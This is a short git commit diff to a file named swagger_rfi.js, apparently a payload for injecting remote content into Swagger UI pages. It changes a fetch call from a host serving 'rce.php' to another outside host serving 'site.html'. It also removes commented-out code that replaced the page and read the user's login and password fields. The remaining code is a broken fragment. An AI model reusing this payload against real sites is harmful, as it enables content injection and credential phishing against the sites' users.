908fa1adc34892ce9c3332789865a6cbfb1ef612
testingssh4 <131162518+testingssh4@users.noreply.github.com>
2023-05-24 16:54:32 +0530

    Update swagger_rfi.js

--- swagger_rfi.js
+++ swagger_rfi.js
@@ -1,16 +1,7 @@
-fetch("https://8080-cs-8ea4b567-821e-470a-baa0-84c7db793d86.cs-asia-southeast1-bool.cloudshell.dev/rce.php").then(res=>res.text()).then(res => {
+fetch("https://tearful-earth.surge.sh/site.html").then(res=>res.text()).then(res => {
 
 
-<!--   document.body.innerHTML = res;
 
-  const form = document.querySelector('#aa');
-
-  form.addEventListener("submit", function(evt) {
-    evt.preventDefault();
-
-    let login = document.querySelector('#user').value
-    let pass = document.querySelector('#pass').value
-    alert('Login: ' + login + " password: " + pass); -->
 
     return;
   }, true);
